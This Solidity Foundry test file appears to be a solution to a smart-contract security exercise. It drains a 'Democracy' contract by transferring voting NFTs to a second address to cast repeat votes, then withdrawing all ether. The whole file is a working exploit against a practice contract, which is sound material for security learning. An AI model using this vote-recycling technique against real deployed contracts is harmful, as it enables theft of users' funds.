// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/week-9-10/Democracy.sol";

contract DemocracyTest is Test {
    Democracy public democracy;

    address private incumbent = makeAddr("incumbent");
    address private attacker = makeAddr("attacker");
    address private attackerSecondAddress = makeAddr("attackerSecondAddress");

    function setUp() public {
        vm.deal(incumbent, 1 ether);
        // Deploy contracts
        vm.prank(incumbent);
        democracy = new Democracy{value: 1 ether}();
    }

    function testIncrement() public {
        // Put your solution here
        // use alternative signature of startPrank to set tx.origin as attacker EOA
        vm.startPrank(attacker, attacker);

        // nominate itself as a challenger
        democracy.nominateChallenger(attacker);
        // transfer 1 NFT to another address to be able to cast only 1 vote to prevent calling election
        democracy.transferFrom(attacker, attackerSecondAddress, 0);
        democracy.vote(attacker);
        // transfer second NFT to exploiter contract
        democracy.transferFrom(attacker, attackerSecondAddress, 1);
        vm.stopPrank();
        
        // cast 2 additional votes via attackerSecondAddress to grant attacker more votes
        vm.prank(attackerSecondAddress);
        democracy.vote(attacker);
        
        // withdraw ether to address
        vm.prank(attacker);
        democracy.withdrawToAddress(attacker);

        _checkSolved();
    }

    function _checkSolved() internal {
        assertEq(address(democracy).balance, 0);
    }
}